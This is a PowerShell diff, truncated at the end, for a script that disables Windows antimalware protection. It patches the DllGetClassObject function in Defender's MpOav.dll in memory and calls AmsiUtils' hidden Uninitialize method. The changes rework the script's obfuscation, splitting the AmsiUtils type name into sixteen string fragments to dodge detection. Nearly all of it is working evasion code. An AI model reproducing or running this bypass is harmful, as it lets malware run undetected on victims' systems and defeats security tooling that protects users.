@@ -1,4 +1,4 @@
-﻿$Zeus = @"
+$Zeus = @"
 using System;
 using System.Runtime.InteropServices;
 public class APIs {
@@ -26,7 +26,30 @@ $LLz7 = [Zeus]::LoadLibrary("MpOav.dll")
 $addy = [Zeus]::GetProcAddress($LLz7,"DllGetClassObject")
 $sz = 0
 [Zeus]::VirtualProtect($addy, [uint32]6, 0x40, [ref]$sz)
-[s`ys`TEM.rUnti`ME.iNtE`rOPsE`RvIcEs.M`aRS`Hal]::CoPy($PiZaCh, 0, $addy, 6)
-$tec = [Ref].aSSembly.gettYPE('Sys'+'tem.Ma'+'nag'+'eme'+'nt.'+'Autom'+'ati'+'on.A'+'m'+'s'+'i'+'U'+'t'+'i'+'l'+'s')
+
+
+[sysTEM.rUntiME.iNtErOPsERvIcEs.MaRSHal]::CoPy($PiZaCh, 0, $addy, 6)
+
+$s1 = 'Sys'
+$s2 = 'tem.Ma'
+$s3 = 'nag'
+$s4 = 'eme'
+$s5 = 'nt.'
+$s6 = 'Autom'
+$s7 = 'ati'
+$s8 = 'on.A'
+$s9 = 'm'
+$s10 = 's'
+$s11 = 'i'
+$s12 = 'U'
+$s13 = 't'
+$s14 = 'i'
+$s15 = 'l'
+$s16 = 's'
+$SSS9 = $s1 + $s2 + $s3 + $s4 + $s5 + $s6 + $s7 + $s8 + $s9 + $s10 + $s11 + $s12 + $s13 + $s14 + $s15 + $s16
+$tec = [Ref].aSSembly.gettYPE($SSS9)
+
+
 $ezi = $tec.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
-$ezi.Invoke($tec,$null)
+
+$ezi.In
